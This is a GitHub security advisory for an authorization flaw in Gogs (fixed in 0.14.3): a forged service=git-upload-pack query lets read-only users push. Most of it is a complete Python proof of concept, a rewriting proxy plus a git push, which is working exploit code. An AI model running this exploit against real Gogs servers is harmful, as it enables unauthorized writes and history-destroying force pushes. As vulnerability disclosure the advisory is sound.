# [H] Gogs allows users to write to readonly repositories using receive-pack + service=git-upload-pack confusion

## Summary
Severity: High
Advisory: GHSA-wmfg-5p4h-5fw3
CVE: CVE-2026-52810
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-wmfg-5p4h-5fw3
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
### Summary

Git smart HTTP authorizes `POST …/git-receive-pack` using the client-supplied service query string (so `?service=git-upload-pack` is evaluated as read access) while routing still runs git receive-pack, allowing push where only read should be allowed.

### Details

Gogs' Git Smart HTTP handler for repository RPCs relies on a client-supplied query parameter to decide which authorization policy to apply. The Git protocol exposes two primary RPCs over HTTP: `upload-pack` for fetch (read) and `receive-pack` for push (write).

In the affected implementation, the code derives the access mode from the `service` query parameter (for example, `service=git-upload-pack`) instead of the actual RPC path being executed. As a result, a request sent to the `receive-pack` endpoint can be incorrectly treated as a read operation if the query parameter claims it is an `upload-pack`. This behavior enables a request to POST to the write endpoint (`/repo.git/git-receive-pack`) while including a query string that indicates a read service.

Route dispatch still executes the receive-pack code path, but authorization is evaluated as if the request were a read. A user who is normally only allowed to read a repository, can now write to it.

One edge case is fully public repositories, viewable by anonymous users. Since performing this exploit results in a `AuthUser` property becoming `nil` in this case, a part of the code that uses it crashes (500 Internal Server Error), making it impossible to exploit.

The two situations in which this is vulnerable are:
* Attacker = collaborator with only Read rights & victim = owner of the repository
* Instance using `REQUIRE_SIGNIN_VIEW = true`. Attacker = any signed in user & victim = any user with a public repository

### PoC

1. Create a Gogs instance (eg. http://localhost:3000) with 2 users: `victim` & `attacker`
2. As the victim, create a new private repository and add the attacker as a Read collaborator:

<img width="1029" height="387" alt="image" src="https://github.com/user-attachments/assets/1f6b7f72-eaab-4970-bf65-221f1cebbbfa" />

3. As the attacker, execute the following Python script (editing global vars as required):

```py
from __future__ import annotations

import os
import shutil
import subprocess
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote, urlsplit, urlunsplit

import requests

REPO_URL = "http://localhost:3000/victim/target"
USERNAME = "attacker"
PASSWORD = "attacker"

class ProxyHandler(BaseHTTPRequestHandler):
    upstream_scheme: str
    upstream_netloc: str
    log_rewrite: bool

    def log_message(self, *_args) -> None:
        return

    def do_GET(self) -> None:
        self._relay("GET")

    def do_POST(self) -> None:
        self._relay("POST")

    def _relay(self, method: str) -> None:
        raw = self.path
        if raw.startswith("http://") or raw.startswith("https://"):
            u = urlsplit(raw)
            scheme, netloc, path, query = u.scheme, u.netloc, u.path, u.query
        else:
            u = urlsplit(raw)
            scheme, netloc, path, query = (
                self.upstream_scheme,
                self.upstream_netloc,
                u.path,
                u.query,
            )

        q = query or ""
        if path.endswith("/git-receive-pack") and "service=" not in q:
            query = f"{q}&service=git-upload-pack" if q else "service=git-upload-pack"
            if self.log_rewrite:
                sys.stderr.write(
                    f"[poc] rewrite receive-pack -> {path}?{query}\n")

        url = urlunsplit((scheme, netloc, path, query, ""))
        length = self.headers.get("Content-Length")
        body = self.rfile.read(int(length)) if length else None

        skip = {
            "host",
            "connection",
            "proxy-connection",
            "content-length",
            "transfer-encoding",
        }
        out_headers = {}
        for k, v in self.headers.items():
            if k.lower() in skip:
                continue
            out_headers[k] = v
        out_headers["Host"] = netloc

        try:
            with requests.request(
                method,
                url,
                data=body,
                headers=out_headers,
                timeout=600,
                stream=True,
            ) as resp:
                resp.raw.decode_content = False
                data = resp.raw.read()
                status = resp.status_code
                headers = resp.headers
        except requests.RequestException as exc:
            self.send_error(502, f"upstream: {exc}")
            return

        hop_by_hop = {
            "transfer-encoding",
            "connection",
            "content-encoding",
            "proxy-authenticate",
            "proxy-authorization",
            "te",
            "trailers",
            "upgrade",
        }
        self.send_response(status)
        for k, v in headers.items():
            if k.lower() in hop_by_hop:
                continue
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

def _run_git(cwd: str, *args: str, env: dict[str, str] | None = None) -> None:
    r = subprocess.run(["git", *args], cwd=cwd, env=env,
                       capture_output=True, text=True)
    if r.returncode != 0:
        sys.stderr.write(r.stdout or "")
        sys.stderr.write(r.stderr or "")
        raise SystemExit(r.returncode)

def main() -> None:
    base = urlsplit(REPO_URL)
    repo_path = f"{base.path.rstrip('/')}.git"
    auth = f"{quote(USERNAME, safe='')}:{quote(PASSWORD, safe='')}@{base.netloc}"
    remote = urlunsplit((base.scheme, auth, repo_path, "", ""))

    ProxyHandler.upstream_scheme = base.scheme
    ProxyHandler.upstream_netloc = base.netloc
    ProxyHandler.log_rewrite = True

    srv = HTTPServer(("127.0.0.1", 0), ProxyHandler)
    port = srv.server_address[1]
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()

    tmp = tempfile.mkdtemp(prefix="gogs-git-poc-")
    try:
        _run_git(tmp, "init")
        _run_git(tmp, "config", "user.email", "poc@example.invalid")
        _run_git(tmp, "config", "user.name", "gogs git http poc")
        with open(f"{tmp}/POC_VULN.txt", "w", encoding="utf-8") as f:
            f.write(
                "Created by local PoC: Git HTTP path is receive-pack while "
                "authorization follows forged service=git-upload-pack.\n"
            )
        _run_git(tmp, "add", "POC_VULN.txt")
        _run_git(tmp, "commit", "-m",
                 "poc: unauthorized push via service query confusion")
        _run_git(tmp, "branch", "-M", "poc/git-http-confusion")
        _run_git(tmp, "remote", "add", "origin", remote)

        env = os.environ.copy()
        proxy_url = f"http://127.0.0.1:{port}"
        env["http_proxy"] = proxy_url
        env["HTTP_PROXY"] = proxy_url
        env["https_proxy"] = proxy_url
        env["HTTPS_PROXY"] = proxy_url

        push = subprocess.run(
            ["git", "push", "-u", "origin", "poc/git-http-confusion"],
            cwd=tmp,
            env=env,
            capture_output=True,
            text=True,
        )
        if push.returncode != 0:
            sys.stderr.write(push.stdout or "")
            sys.stderr.write(push.stderr or "")
            sys.exit(push.returncode)

        sys.stdout.write(push.stdout or "")
        sys.stderr.write(
            f"\n[poc] push succeeded. Branch poc/git-http-confusion should exist on {REPO_URL}.\n"
        )
    finally:
        srv.shutdown()
        shutil.rmtree(tmp, ignore_errors=True)

if __name__ == "__main__":
    main()
```

4. Reload the repo URL and notice the attacker successfully wrote to the read-only repo:

<img width="1038" height="398" alt="image" src="https://github.com/user-attachments/assets/4ada8b19-8cbd-40b0-a324-e93ed4d1c965" />

### Impact

If you can read a repository, and an anonymous user cannot, you can write to it. This affects some cases where read-only collaborator access is given, but is most impactful in instances with `REQUIRE_SIGNIN_VIEW = true` configured, because then all repositories will be writable to any user.
Using force push this can also affect availability, as the original code in the main branch, for example, can be overridden without leaving history.

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-wmfg-5p4h-5fw3
- https://nvd.nist.gov/vuln/detail/CVE-2026-52810
- https://github.com/gogs/gogs/pull/8331
- https://github.com/gogs/gogs/commit/7c9cf53aca957959bcd98b0cc987d9901b7cb184
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.3
